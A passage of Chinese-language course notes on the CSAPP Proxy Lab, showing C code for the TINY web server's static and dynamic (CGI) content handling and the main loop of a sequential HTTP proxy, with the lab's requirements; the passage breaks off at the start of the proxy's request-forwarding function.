</span><span id=__span-178-15><a id=__codelineno-178-15 name=__codelineno-178-15></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"%sContent-type: %s</span><span class=se>\r\n\r\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>filetype</span><span class=p>);</span>
</span><span id=__span-178-16><a id=__codelineno-178-16 name=__codelineno-178-16></a><span class=w>    </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
</span><span id=__span-178-17><a id=__codelineno-178-17 name=__codelineno-178-17></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>"Response headers:</span><span class=se>\n</span><span class=s>"</span><span class=p>);</span>
</span><span id=__span-178-18><a id=__codelineno-178-18 name=__codelineno-178-18></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>"%s"</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-178-19><a id=__codelineno-178-19 name=__codelineno-178-19></a>
</span><span id=__span-178-20><a id=__codelineno-178-20 name=__codelineno-178-20></a><span class=w>    </span><span class=cm>/* 发送响应主体给client */</span>
</span><span id=__span-178-21><a id=__codelineno-178-21 name=__codelineno-178-21></a><span class=w>    </span><span class=n>srcfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=n>O_RDONLY</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w> </span><span class=c1>// 获得文件描述符</span>
</span><span id=__span-178-22><a id=__codelineno-178-22 name=__codelineno-178-22></a><span class=w>    </span><span class=n>srcp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>filesize</span><span class=p>,</span><span class=w> </span><span class=n>PROT_READ</span><span class=p>,</span><span class=w> </span><span class=n>MAP_PRIVATE</span><span class=p>,</span><span class=w> </span><span class=n>srcfd</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w> </span><span class=c1>// 映射文件到内存</span>
</span><span id=__span-178-23><a id=__codelineno-178-23 name=__codelineno-178-23></a><span class=w>    </span><span class=n>Close</span><span class=p>(</span><span class=n>srcfd</span><span class=p>);</span>
</span><span id=__span-178-24><a id=__codelineno-178-24 name=__codelineno-178-24></a><span class=w>    </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>srcp</span><span class=p>,</span><span class=w> </span><span class=n>filesize</span><span class=p>);</span><span class=w> </span><span class=c1>// 文件传送</span>
</span><span id=__span-178-25><a id=__codelineno-178-25 name=__codelineno-178-25></a><span class=w>    </span><span class=n>Munmap</span><span class=p>(</span><span class=n>srcp</span><span class=p>,</span><span class=w> </span><span class=n>filesize</span><span class=p>);</span><span class=w>         </span><span class=c1>// 释放内存</span>
</span><span id=__span-178-26><a id=__codelineno-178-26 name=__codelineno-178-26></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_30>提供动态内容<a class=headerlink href=#_30 title="Permanent link">¶</a></h4> <p>TINY 派生一个子进程并在子进程的上下文中运行一个 CGI 程序：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-179-1> 1</a></span>
<span class=normal><a href=#__codelineno-179-2> 2</a></span>
<span class=normal><a href=#__codelineno-179-3> 3</a></span>
<span class=normal><a href=#__codelineno-179-4> 4</a></span>
<span class=normal><a href=#__codelineno-179-5> 5</a></span>
<span class=normal><a href=#__codelineno-179-6> 6</a></span>
<span class=normal><a href=#__codelineno-179-7> 7</a></span>
<span class=normal><a href=#__codelineno-179-8> 8</a></span>
<span class=normal><a href=#__codelineno-179-9> 9</a></span>
<span class=normal><a href=#__codelineno-179-10>10</a></span>
<span class=normal><a href=#__codelineno-179-11>11</a></span>
<span class=normal><a href=#__codelineno-179-12>12</a></span>
<span class=normal><a href=#__codelineno-179-13>13</a></span>
<span class=normal><a href=#__codelineno-179-14>14</a></span>
<span class=normal><a href=#__codelineno-179-15>15</a></span>
<span class=normal><a href=#__codelineno-179-16>16</a></span>
<span class=normal><a href=#__codelineno-179-17>17</a></span>
<span class=normal><a href=#__codelineno-179-18>18</a></span>
<span class=normal><a href=#__codelineno-179-19>19</a></span>
<span class=normal><a href=#__codelineno-179-20>20</a></span>
<span class=normal><a href=#__codelineno-179-21>21</a></span>
<span class=normal><a href=#__codelineno-179-22>22</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-179-1><a id=__codelineno-179-1 name=__codelineno-179-1></a><span class=cm>/*</span>
</span><span id=__span-179-2><a id=__codelineno-179-2 name=__codelineno-179-2></a><span class=cm>* 服务动态内容</span>
</span><span id=__span-179-3><a id=__codelineno-179-3 name=__codelineno-179-3></a><span class=cm>*/</span>
</span><span id=__span-179-4><a id=__codelineno-179-4 name=__codelineno-179-4></a><span class=kt>void</span><span class=w> </span><span class=nf>serve_dynamic</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>cgiargs</span><span class=p>)</span>
</span><span id=__span-179-5><a id=__codelineno-179-5 name=__codelineno-179-5></a><span class=p>{</span>
</span><span id=__span-179-6><a id=__codelineno-179-6 name=__codelineno-179-6></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=o>*</span><span class=n>emptylist</span><span class=p>[]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nb>NULL</span><span class=w> </span><span class=p>};</span>
</span><span id=__span-179-7><a id=__codelineno-179-7 name=__codelineno-179-7></a>
</span><span id=__span-179-8><a id=__codelineno-179-8 name=__codelineno-179-8></a><span class=w>    </span><span class=cm>/* Return first part of HTTP response */</span>
</span><span id=__span-179-9><a id=__codelineno-179-9 name=__codelineno-179-9></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"HTTP/1.0 200 OK</span><span class=se>\r\n</span><span class=s>"</span><span class=p>);</span>
</span><span id=__span-179-10><a id=__codelineno-179-10 name=__codelineno-179-10></a><span class=w>    </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span><span class=w>  </span><span class=c1>// 响应行</span>
</span><span id=__span-179-11><a id=__codelineno-179-11 name=__codelineno-179-11></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=s>"%sServer: Tiny Web Server</span><span class=se>\r\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-179-12><a id=__codelineno-179-12 name=__codelineno-179-12></a><span class=w>    </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span><span class=w>  </span><span class=c1>// 响应报头</span>
</span><span id=__span-179-13><a id=__codelineno-179-13 name=__codelineno-179-13></a>
</span><span id=__span-179-14><a id=__codelineno-179-14 name=__codelineno-179-14></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Fork</span><span class=p>()</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=c1>// 子进程</span>
</span><span id=__span-179-15><a id=__codelineno-179-15 name=__codelineno-179-15></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-179-16><a id=__codelineno-179-16 name=__codelineno-179-16></a><span class=w>        </span><span class=cm>/* Real server would set all CGI vars here */</span>
</span><span id=__span-179-17><a id=__codelineno-179-17 name=__codelineno-179-17></a><span class=w>        </span><span class=n>setenv</span><span class=p>(</span><span class=s>"QUERY_STRING"</span><span class=p>,</span><span class=w> </span><span class=n>cgiargs</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>);</span><span class=w> </span><span class=c1>// 设置环境变量</span>
</span><span id=__span-179-18><a id=__codelineno-179-18 name=__codelineno-179-18></a><span class=w>        </span><span class=n>Dup2</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=w> </span><span class=n>STDOUT_FILENO</span><span class=p>);</span><span class=w>            </span><span class=c1>// 重定向标准输出到 client</span>
</span><span id=__span-179-19><a id=__codelineno-179-19 name=__codelineno-179-19></a><span class=w>        </span><span class=n>Execve</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=n>emptylist</span><span class=p>,</span><span class=w> </span><span class=n>environ</span><span class=p>);</span><span class=w> </span><span class=c1>// 执行 CGI 程序</span>
</span><span id=__span-179-20><a id=__codelineno-179-20 name=__codelineno-179-20></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-179-21><a id=__codelineno-179-21 name=__codelineno-179-21></a><span class=w>    </span><span class=n>Wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span><span class=w> </span><span class=c1>// 等待子进程结束</span>
</span><span id=__span-179-22><a id=__codelineno-179-22 name=__codelineno-179-22></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_31>主函数<a class=headerlink href=#_31 title="Permanent link">¶</a></h4> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-180-1> 1</a></span>
<span class=normal><a href=#__codelineno-180-2> 2</a></span>
<span class=normal><a href=#__codelineno-180-3> 3</a></span>
<span class=normal><a href=#__codelineno-180-4> 4</a></span>
<span class=normal><a href=#__codelineno-180-5> 5</a></span>
<span class=normal><a href=#__codelineno-180-6> 6</a></span>
<span class=normal><a href=#__codelineno-180-7> 7</a></span>
<span class=normal><a href=#__codelineno-180-8> 8</a></span>
<span class=normal><a href=#__codelineno-180-9> 9</a></span>
<span class=normal><a href=#__codelineno-180-10>10</a></span>
<span class=normal><a href=#__codelineno-180-11>11</a></span>
<span class=normal><a href=#__codelineno-180-12>12</a></span>
<span class=normal><a href=#__codelineno-180-13>13</a></span>
<span class=normal><a href=#__codelineno-180-14>14</a></span>
<span class=normal><a href=#__codelineno-180-15>15</a></span>
<span class=normal><a href=#__codelineno-180-16>16</a></span>
<span class=normal><a href=#__codelineno-180-17>17</a></span>
<span class=normal><a href=#__codelineno-180-18>18</a></span>
<span class=normal><a href=#__codelineno-180-19>19</a></span>
<span class=normal><a href=#__codelineno-180-20>20</a></span>
<span class=normal><a href=#__codelineno-180-21>21</a></span>
<span class=normal><a href=#__codelineno-180-22>22</a></span>
<span class=normal><a href=#__codelineno-180-23>23</a></span>
<span class=normal><a href=#__codelineno-180-24>24</a></span>
<span class=normal><a href=#__codelineno-180-25>25</a></span>
<span class=normal><a href=#__codelineno-180-26>26</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-180-1><a id=__codelineno-180-1 name=__codelineno-180-1></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>)</span>
</span><span id=__span-180-2><a id=__codelineno-180-2 name=__codelineno-180-2></a><span class=p>{</span>
</span><span id=__span-180-3><a id=__codelineno-180-3 name=__codelineno-180-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>listenfd</span><span class=p>,</span><span class=w> </span><span class=n>connfd</span><span class=p>;</span>
</span><span id=__span-180-4><a id=__codelineno-180-4 name=__codelineno-180-4></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>hostname</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>port</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-180-5><a id=__codelineno-180-5 name=__codelineno-180-5></a><span class=w>    </span><span class=kt>socklen_t</span><span class=w> </span><span class=n>clientlen</span><span class=p>;</span>
</span><span id=__span-180-6><a id=__codelineno-180-6 name=__codelineno-180-6></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>sockaddr_storage</span><span class=w> </span><span class=n>clientaddr</span><span class=p>;</span>
</span><span id=__span-180-7><a id=__codelineno-180-7 name=__codelineno-180-7></a>
</span><span id=__span-180-8><a id=__codelineno-180-8 name=__codelineno-180-8></a><span class=w>    </span><span class=cm>/* 检查命令行参数 */</span>
</span><span id=__span-180-9><a id=__codelineno-180-9 name=__codelineno-180-9></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argc</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>2</span><span class=p>)</span>
</span><span id=__span-180-10><a id=__codelineno-180-10 name=__codelineno-180-10></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-180-11><a id=__codelineno-180-11 name=__codelineno-180-11></a><span class=w>        </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>"usage: %s &lt;port&gt;</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span><span id=__span-180-12><a id=__codelineno-180-12 name=__codelineno-180-12></a><span class=w>        </span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span><span id=__span-180-13><a id=__codelineno-180-13 name=__codelineno-180-13></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-180-14><a id=__codelineno-180-14 name=__codelineno-180-14></a>
</span><span id=__span-180-15><a id=__codelineno-180-15 name=__codelineno-180-15></a><span class=w>    </span><span class=cm>/* 监听端口 */</span>
</span><span id=__span-180-16><a id=__codelineno-180-16 name=__codelineno-180-16></a><span class=w>    </span><span class=n>listenfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Open_listenfd</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span><span id=__span-180-17><a id=__codelineno-180-17 name=__codelineno-180-17></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-180-18><a id=__codelineno-180-18 name=__codelineno-180-18></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-180-19><a id=__codelineno-180-19 name=__codelineno-180-19></a><span class=w>        </span><span class=n>clientlen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>sockaddr_storage</span><span class=p>);</span>
</span><span id=__span-180-20><a id=__codelineno-180-20 name=__codelineno-180-20></a><span class=w>        </span><span class=n>connfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Accept</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>SA</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>clientaddr</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>clientlen</span><span class=p>);</span><span class=w> </span><span class=c1>// 接受请求</span>
</span><span id=__span-180-21><a id=__codelineno-180-21 name=__codelineno-180-21></a><span class=w>        </span><span class=n>Getnameinfo</span><span class=p>((</span><span class=n>SA</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>clientaddr</span><span class=p>,</span><span class=w> </span><span class=n>clientlen</span><span class=p>,</span><span class=w> </span><span class=n>hostname</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>,</span><span class=w> </span><span class=n>port</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w> </span><span class=c1>// 获取客户端地址</span>
</span><span id=__span-180-22><a id=__codelineno-180-22 name=__codelineno-180-22></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Accepted connection from (%s, %s)</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>hostname</span><span class=p>,</span><span class=w> </span><span class=n>port</span><span class=p>);</span>
</span><span id=__span-180-23><a id=__codelineno-180-23 name=__codelineno-180-23></a><span class=w>        </span><span class=n>doit</span><span class=p>(</span><span class=n>connfd</span><span class=p>);</span><span class=w> </span><span class=c1>// 处理请求</span>
</span><span id=__span-180-24><a id=__codelineno-180-24 name=__codelineno-180-24></a><span class=w>        </span><span class=n>Close</span><span class=p>(</span><span class=n>connfd</span><span class=p>);</span>
</span><span id=__span-180-25><a id=__codelineno-180-25 name=__codelineno-180-25></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-180-26><a id=__codelineno-180-26 name=__codelineno-180-26></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=part-1-implementing-a-sequential-web-proxy>Part 1: Implementing a sequential web proxy<a class=headerlink href=#part-1-implementing-a-sequential-web-proxy title="Permanent link">¶</a></h3> <p>要求：</p> <ul> <li>实现一个处理 HTTP/1.0 GET 请求的基本顺序 web 代理</li> <li>如果接收到一个浏览器请求为 HTTP/1.1 版本，则应将它作为 HTTP/1.0 请求转发</li> <li>转发合法的 HTTP 请求<ul> <li>假设请求为 GET <a href=http://www.cmu.edu/hub/index.html>http://www.cmu.edu/hub/index.html</a> HTTP/1.1</li> <li>则主机名为 <a href=http://www.cmu.edu>www.cmu.edu</a></li> <li>请求的页面为 /hub/index.html</li> <li>HTTP 请求每行以 \r\n 结束，以一个空行 \r\n 结尾</li> </ul> </li> <li>代理发送的请求的 header 为：<ul> <li>Host: 如 Host: <a href=http://www.cmu.edu>www.cmu.edu</a></li> <li>User-Agent: 如 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</li> <li>Connection: 必须发送 Connection: close</li> <li>Proxy-Connection: 必须发送 Proxy-Connection: close</li> </ul> </li> <li>要处理过早关闭的连接，即必须捕获 SIGPIPE 信号</li> </ul> <h4 id=_32>等待客户端连接<a class=headerlink href=#_32 title="Permanent link">¶</a></h4> <p>首先是我们的main函数，不断等待客户端的连接，代码与 TINY服务器代码完全相同：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-181-1> 1</a></span>
<span class=normal><a href=#__codelineno-181-2> 2</a></span>
<span class=normal><a href=#__codelineno-181-3> 3</a></span>
<span class=normal><a href=#__codelineno-181-4> 4</a></span>
<span class=normal><a href=#__codelineno-181-5> 5</a></span>
<span class=normal><a href=#__codelineno-181-6> 6</a></span>
<span class=normal><a href=#__codelineno-181-7> 7</a></span>
<span class=normal><a href=#__codelineno-181-8> 8</a></span>
<span class=normal><a href=#__codelineno-181-9> 9</a></span>
<span class=normal><a href=#__codelineno-181-10>10</a></span>
<span class=normal><a href=#__codelineno-181-11>11</a></span>
<span class=normal><a href=#__codelineno-181-12>12</a></span>
<span class=normal><a href=#__codelineno-181-13>13</a></span>
<span class=normal><a href=#__codelineno-181-14>14</a></span>
<span class=normal><a href=#__codelineno-181-15>15</a></span>
<span class=normal><a href=#__codelineno-181-16>16</a></span>
<span class=normal><a href=#__codelineno-181-17>17</a></span>
<span class=normal><a href=#__codelineno-181-18>18</a></span>
<span class=normal><a href=#__codelineno-181-19>19</a></span>
<span class=normal><a href=#__codelineno-181-20>20</a></span>
<span class=normal><a href=#__codelineno-181-21>21</a></span>
<span class=normal><a href=#__codelineno-181-22>22</a></span>
<span class=normal><a href=#__codelineno-181-23>23</a></span>
<span class=normal><a href=#__codelineno-181-24>24</a></span>
<span class=normal><a href=#__codelineno-181-25>25</a></span>
<span class=normal><a href=#__codelineno-181-26>26</a></span>
<span class=normal><a href=#__codelineno-181-27>27</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-181-1><a id=__codelineno-181-1 name=__codelineno-181-1></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>)</span>
</span><span id=__span-181-2><a id=__codelineno-181-2 name=__codelineno-181-2></a><span class=p>{</span>
</span><span id=__span-181-3><a id=__codelineno-181-3 name=__codelineno-181-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>listenfd</span><span class=p>,</span><span class=w> </span><span class=n>connfd</span><span class=p>;</span>
</span><span id=__span-181-4><a id=__codelineno-181-4 name=__codelineno-181-4></a><span class=w>    </span><span class=kt>socklen_t</span><span class=w> </span><span class=n>clientlen</span><span class=p>;</span>
</span><span id=__span-181-5><a id=__codelineno-181-5 name=__codelineno-181-5></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>hostname</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>],</span><span class=w> </span><span class=n>port</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span>
</span><span id=__span-181-6><a id=__codelineno-181-6 name=__codelineno-181-6></a>
</span><span id=__span-181-7><a id=__codelineno-181-7 name=__codelineno-181-7></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>sockaddr_storage</span><span class=w> </span><span class=n>clientaddr</span><span class=p>;</span>
</span><span id=__span-181-8><a id=__codelineno-181-8 name=__codelineno-181-8></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argc</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>2</span><span class=p>)</span>
</span><span id=__span-181-9><a id=__codelineno-181-9 name=__codelineno-181-9></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-181-10><a id=__codelineno-181-10 name=__codelineno-181-10></a><span class=w>        </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>"usage :%s &lt;port&gt; </span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span><span id=__span-181-11><a id=__codelineno-181-11 name=__codelineno-181-11></a><span class=w>        </span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span><span id=__span-181-12><a id=__codelineno-181-12 name=__codelineno-181-12></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-181-13><a id=__codelineno-181-13 name=__codelineno-181-13></a><span class=w>    </span><span class=n>signal</span><span class=p>(</span><span class=n>SIGPIPE</span><span class=p>,</span><span class=w> </span><span class=n>sigpipe_handler</span><span class=p>);</span><span class=w>   </span><span class=c1>// 捕获SIGPIPE信号</span>
</span><span id=__span-181-14><a id=__codelineno-181-14 name=__codelineno-181-14></a><span class=w>    </span><span class=n>listenfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Open_listenfd</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span><span id=__span-181-15><a id=__codelineno-181-15 name=__codelineno-181-15></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span><span id=__span-181-16><a id=__codelineno-181-16 name=__codelineno-181-16></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-181-17><a id=__codelineno-181-17 name=__codelineno-181-17></a><span class=w>        </span><span class=n>clientlen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>clientaddr</span><span class=p>);</span>
</span><span id=__span-181-18><a id=__codelineno-181-18 name=__codelineno-181-18></a><span class=w>        </span><span class=n>connfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Accept</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>SA</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>clientaddr</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>clientlen</span><span class=p>);</span>
</span><span id=__span-181-19><a id=__codelineno-181-19 name=__codelineno-181-19></a>
</span><span id=__span-181-20><a id=__codelineno-181-20 name=__codelineno-181-20></a><span class=w>        </span><span class=n>Getnameinfo</span><span class=p>((</span><span class=n>SA</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>clientaddr</span><span class=p>,</span><span class=w> </span><span class=n>clientlen</span><span class=p>,</span><span class=w> </span><span class=n>hostname</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>,</span><span class=w> </span><span class=n>port</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-181-21><a id=__codelineno-181-21 name=__codelineno-181-21></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Accepted connection from (%s %s).</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>hostname</span><span class=p>,</span><span class=w> </span><span class=n>port</span><span class=p>);</span>
</span><span id=__span-181-22><a id=__codelineno-181-22 name=__codelineno-181-22></a>
</span><span id=__span-181-23><a id=__codelineno-181-23 name=__codelineno-181-23></a><span class=w>        </span><span class=n>doit</span><span class=p>(</span><span class=n>connfd</span><span class=p>);</span>
</span><span id=__span-181-24><a id=__codelineno-181-24 name=__codelineno-181-24></a><span class=w>        </span><span class=n>Close</span><span class=p>(</span><span class=n>connfd</span><span class=p>);</span><span class=w> </span><span class=c1>// 关闭客户端的连接描述符</span>
</span><span id=__span-181-25><a id=__codelineno-181-25 name=__codelineno-181-25></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-181-26><a id=__codelineno-181-26 name=__codelineno-181-26></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-181-27><a id=__codelineno-181-27 name=__codelineno-181-27></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_33>转发与回复<a class=headerlink href=#_33 title="Permanent link">¶</a></h4> <p><code>doit</code>函数前半部分与 TINY 服务器相似，不同的是将后半部分的请求处理改为转发给服务器，再将服务器的回复回复给客户端:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-182-1> 1</a></span>
<span class=normal><a href=#__codelineno-182-2> 2</a></span>
<span class=normal><a href=#__codelineno-182-3> 3</a></span>
<span class=normal><a href=#__codelineno-182-4> 4</a></span>
<span class=normal><a href=#__codelineno-182-5> 5</a></span>
<span class=normal><a href=#__codelineno-182-6> 6</a></span>
<span class=normal><a href=#__codelineno-182-7> 7</a></span>
<span class=normal><a href=#__codelineno-182-8> 8</a></span>
<span class=normal><a href=#__codelineno-182-9> 9</a></span>
<span class=normal><a href=#__codelineno-182-10>10</a></span>
<span class=normal><a href=#__codelineno-182-11>11</a></span>
<span class=normal><a href=#__codelineno-182-12>12</a></span>
<span class=normal><a href=#__codelineno-182-13>13</a></span>
<span class=normal><a href=#__codelineno-182-14>14</a></span>
<span class=normal><a href=#__codelineno-182-15>15</a></span>
<span class=normal><a href=#__codelineno-182-16>16</a></span>
<span class=normal><a href=#__codelineno-182-17>17</a></span>
<span class=normal><a href=#__codelineno-182-18>18</a></span>
<span class=normal><a href=#__codelineno-182-19>19</a></span>
<span class=normal><a href=#__codelineno-182-20>20</a></span>
<span class=normal><a href=#__codelineno-182-21>21</a></span>
<span class=normal><a href=#__codelineno-182-22>22</a></span>
<span class=normal><a href=#__codelineno-182-23>23</a></span>
<span class=normal><a href=#__codelineno-182-24>24</a></span>
<span class=normal><a href=#__codelineno-182-25>25</a></span>
<span class=normal><a href=#__codelineno-182-26>26</a></span>
<span class=normal><a href=#__codelineno-182-27>27</a></span>
<span class=normal><a href=#__codelineno-182-28>28</a></span>
<span class=normal><a href=#__codelineno-182-29>29</a></span>
<span class=normal><a href=#__codelineno-182-30>30</a></span>
<span class=normal><a href=#__codelineno-182-31>31</a></span>
<span class=normal><a href=#__codelineno-182-32>32</a></span>
<span class=normal><a href=#__codelineno-182-33>33</a></span>
<span class=normal><a href=#__codelineno-182-34>34</a></span>
<span class=normal><a href=#__codelineno-182-35>35</a></span>
<span class=normal><a href=#__codelineno-182-36>36</a></span>
<span class=normal><a href=#__codelineno-182-37>37</a></span>
<span class=normal><a href=#__codelineno-182-38>38</a></span>
<span class=normal><a href=#__codelineno-182-39>39</a></span>
<span class=normal><a href=#__codelineno-182-40>40</a></span>
<span class=normal><a href=#__codelineno-182-41>41</a></span>
<span class=normal><a href=#__codelineno-182-42>42</a></span>
<span class=normal><a href=#__codelineno-182-43>43</a></span>
<span class=normal><a href=#__codelineno-182-44>44</a></span>
